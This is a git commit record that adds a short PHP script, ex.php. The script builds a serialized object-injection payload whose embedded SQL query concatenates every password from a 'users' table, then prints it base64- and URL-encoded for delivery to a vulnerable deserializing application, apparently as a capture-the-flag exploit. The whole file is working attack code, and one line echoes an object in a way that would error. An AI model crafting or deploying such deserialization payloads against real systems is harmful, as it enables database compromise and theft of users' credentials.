b28071b84e4371880cc76858623790bec46dd511
AdamHacham <adamhacham2@gmail.com>
2021-11-26 16:19:12 +0100

    first commitIII

---
+++ ex.php
@@ -0,0 +1,17 @@
+<?php
+
+class SQL
+{
+    public $query;
+    public $conn;
+
+    function __construct()
+    {
+        $this->query = "SELECT GROUP_CONCAT(password) as username from users;";
+        $this->conn = NULL;
+    }
+}
+
+$inst = new SQL();
+echo $inst;
+echo  urlencode(base64_encode(" " . serialize($inst)));
